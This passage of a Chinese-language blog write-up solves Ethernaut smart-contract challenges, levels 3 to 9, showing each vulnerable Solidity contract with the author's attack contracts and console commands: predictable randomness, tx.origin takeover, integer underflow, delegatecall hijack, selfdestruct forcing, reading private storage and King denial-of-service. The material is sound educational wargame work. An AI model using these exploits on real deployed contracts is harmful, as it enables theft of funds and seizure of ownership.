class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然，你要知道，想要在智能合约中实现随机是很难的，所以，我们完全可以部署一个智能合约，算出答案后调用相应的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">CoinFlip</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number<span class="number">-1</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Level3Exp &#123;</span><br><span class="line">    address public vulnerable_contract;</span><br><span class="line">    address public owner;</span><br><span class="line">    CoinFlip private A;</span><br><span class="line">uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line">event Attack(address indexed <span class="keyword">from</span>, uint guess);</span><br><span class="line"></span><br><span class="line">modifier OwnerOnly()&#123;</span><br><span class="line"><span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Level3Exp</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">owner = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">address vuln_addr</span>) <span class="title">public</span> <span class="title">OwnerOnly</span> </span>&#123;</span><br><span class="line">vulnerable_contract = vuln_addr;</span><br><span class="line">A = CoinFlip(vulnerable_contract);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">OwnerOnly</span> </span>&#123;</span><br><span class="line">uint256 blockValue = uint256(block.blockhash(block.number<span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">A.flip(side);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，怎么在这个挑战中部署合约呢？</p><p>我们可以通过Remix和MetaMask配合使用（用得舒心）。</p><p>感觉不难，自己摸索下就OK啦。</p><blockquote><p>Generating random numbers in solidity can be tricky. There currently isn’t a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.</p><p>Some options include using Bitcoin block headers (verified through <a href="http://btcrelay.org/" target="_blank" rel="noopener">BTC Relay</a>), <a href="https://github.com/randao/randao" target="_blank" rel="noopener">RANDAO</a>, or <a href="http://www.oraclize.it/" target="_blank" rel="noopener">Oraclize</a>).</p></blockquote><h3 id="level-4-Telephone"><a href="#level-4-Telephone" class="headerlink" title="level 4 Telephone"></a>level 4 Telephone</h3><blockquote><p>Claim ownership of the contract below to complete this level.</p><p>  Things that might help</p><ul><li>See the Help page above, section “Beyond the console”</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Telephone</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很简单啦，只是需要tx.origin和msg.sender不同而已。</p><p>我们知道，当通过call调用别的合约时，tx.origin没有变，但是msg.sender是会变化的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Telephone</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Level4Exp &#123;</span><br><span class="line">    address public vulnerable_contract;</span><br><span class="line">    address public owner;</span><br><span class="line">    Telephone private A;</span><br><span class="line">event Attack(address indexed <span class="keyword">from</span>, uint guess);</span><br><span class="line"></span><br><span class="line">modifier OwnerOnly()&#123;</span><br><span class="line"><span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Level4Exp</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">owner = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">address vuln_addr</span>) <span class="title">public</span> <span class="title">OwnerOnly</span> </span>&#123;</span><br><span class="line">vulnerable_contract = vuln_addr;</span><br><span class="line">A = Telephone(vulnerable_contract);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">OwnerOnly</span> </span>&#123;</span><br><span class="line">A.changeOwner(msg.sender);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>While this example may be simple, confusing <code>tx.origin</code> with <code>msg.sender</code> can lead to phishing-style attacks, such as <a href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/" target="_blank" rel="noopener">this</a>.</p><p>An example of a possible attack is outlined below.</p><ol><li>Use <code>tx.origin</code> to determine whose tokens to transfer, e.g.</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; function transfer(address _to, uint _value) &#123;</span><br><span class="line">&gt;   tokens[tx.origin] -= _value;</span><br><span class="line">&gt;   tokens[_to] += _value;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><ol><li>Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; function () payable &#123;</span><br><span class="line">&gt;   token.transfer(attackerAddress, 10000);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><ol><li>In this scenario, <code>tx.origin</code> will be the victim’s address (while <code>msg.sender</code> will be the malicious contract’s address), resulting in the funds being transferred from the victim to the attacker.</li></ol></blockquote><h3 id="level-5-Token"><a href="#level-5-Token" class="headerlink" title="level 5 Token"></a>level 5 Token</h3><blockquote><p>The goal of this level is for you to hack the basic token contract below.</p><p>You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.</p><p>  Things that might help:</p><ul><li>What is an odometer?</li></ul></blockquote><p>源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Token</span>(<span class="params">uint _initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单可以看出来，整数下溢。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">随便找个地址，调用transfer函数，转30(&gt;20)过去，你就会有2**256-10</span><br></pre></td></tr></table></figure><blockquote><p>Overflows are very common in solidity and must be checked for with control statements such as:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; if(a + c &gt; a) &#123;</span><br><span class="line">&gt;   a = a + c;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>An easier alternative is to use OpenZeppelin’s SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; a = a.add(c);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>If there is an overflow, the code will revert.</p></blockquote><h3 id="level-6-Delegation"><a href="#level-6-Delegation" class="headerlink" title="level 6 Delegation"></a>level 6 Delegation</h3><blockquote><p>The goal of this level is for you claim ownership of the instance you are given.</p><p>  Things that might help</p><ul><li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.</li><li>Fallback methods</li><li>Method ids</li></ul></blockquote><p>源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegate</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegation</span>(<span class="params">address _delegateAddress</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">      <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以说是非常明显了，直接造msg.data，调用Delegation的fallback函数，然后，从外部获取代码并进行调用，简单的，调用Delgate的pwn函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们知道，</span><br><span class="line">contract.sendTransaction(&#123;data:web3.sha3(&quot;pwn()&quot;).slice(0,10)&#125;)</span><br><span class="line">调用delegate里面的pwn函数</span><br></pre></td></tr></table></figure><blockquote><p>Usage of <code>delegatecall</code> is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying “here, -other contract- or -other library-, do whatever you want with my state”. Delegates have complete access to your contract’s state. The <code>delegatecall</code> function is a powerful feature, but a dangerous one, and must be used with extreme care.</p><p>Please refer to the <a href="https://blog.zeppelin.solutions/on-the-parity-wallet-multisig-hack-405a8c12e8f7" target="_blank" rel="noopener">The Parity Wallet Hack Explained</a> article for an accurate explanation of how this idea was used to steal 30M USD.</p></blockquote><h3 id="level-7-Force"><a href="#level-7-Force" class="headerlink" title="level 7 Force"></a>level 7 Force</h3><blockquote><p>Some contracts will simply not take your money <code>¯\_(ツ)_/¯</code></p><p>The goal of this level is to make the balance of the contract greater than zero.</p><p>  Things that might help:</p><ul><li>Fallback methods</li><li>Sometimes the best way to attack a contract is with another contract.</li><li>See the Help page above, section “Beyond the console”</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Force &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">  /~____  =ø= /</span></span><br><span class="line"><span class="comment"> (______)__m_m)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br></pre></td></tr></table></figure><p>这题有点意思的样子，但是只是要该合约balance大于0</p><p>办法有的。</p><p>有一些办法是现阶段无法拒绝往里面转钱的，一是用这个地址去挖矿，二是通过selfdestruct强行转钱。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Level7Exp &#123;</span><br><span class="line">    address public vulnerable_contract;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">modifier OwnerOnly()&#123;</span><br><span class="line"><span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Level7Exp</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">owner = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">address vuln_addr</span>) <span class="title">public</span> <span class="title">payable</span> <span class="title">OwnerOnly</span> </span>&#123;</span><br><span class="line">vulnerable_contract = vuln_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">OwnerOnly</span> </span>&#123;</span><br><span class="line">        selfdestruct(vulnerable_contract);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 部署合约</span><br><span class="line">2. init传入目标合约地址，同时调用init时转一点ether进去</span><br><span class="line">3. 调用attack</span><br></pre></td></tr></table></figure><blockquote><p>In solidity, for a contract to be able to receive ether, the fallback function must be marked ‘payable’.</p><p>However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant <code>this.balance == 0</code> for any contract logic.</p></blockquote><h3 id="level-8-Vault"><a href="#level-8-Vault" class="headerlink" title="level 8 Vault"></a>level 8 Vault</h3><blockquote><p> Unlock the vault to pass the level! </p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Vault</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常天真地以为private就不可见了么，智能合约的每一笔交易是公开可见的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address,1,(e,v)=&gt;alert(web3.toAscii(v)))</span><br><span class="line">可以看到弹窗内容即为密码</span><br><span class="line">A very strong secret password :)</span><br><span class="line">然后，调用</span><br><span class="line">contract.unlock(&quot;A very strong secret password :)&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>It’s important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.</p><p>To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. <a href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/" target="_blank" rel="noopener">zk-SNARKs</a> provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.</p><p>Get new instanceGo to the next level!</p></blockquote><h3 id="level-9-King"><a href="#level-9-King" class="headerlink" title="level 9 King"></a>level 9 King</h3><blockquote><p>The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD</p><p>Such a fun game. Your goal is to break it.</p><p>When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.</p></blockquote><p>源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract King is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  address public king;</span><br><span class="line">  uint public prize;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">King</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>嗯，只要我们成为国王，然后，我们身份是合约，</p><p>如果我们没有定义fallback函数或者fallback函数没有payable修饰符或者fallback函数一直是revert，则transfer就一直会失败而回滚。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Level9Exp &#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params">address vulnerable_contract</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    vulnerable_contract.call.gas(<span class="number">1000000</span>).value(msg.value)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">    revert();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>attack的时候注意要转比prize多钱即可。（注意：不知道是chrome的插件有问题还是什么，自己手动调节下gas price和gas limit，确保不会报错transaction underprice和不会运行一会儿out-of-gas）</p><blockquote><p>Most of Ethernaut’s levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.</p><p>In this case, see: <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html" target="_blank" rel="noopener">King of the Ether</a> and <a href="http://www.kingoftheether.com/postmortem.html" target="_blank" rel="noopener">King of the Ether Postmortem</a></p></blockquote><h3 id="level-10-Re-entrancy"><a href="#level-10-Re-entrancy" class="headerlink" title="level 10 Re-entrancy"></a>level 10 Re-entrancy</h3><blockquote><p>The goal of this level is for 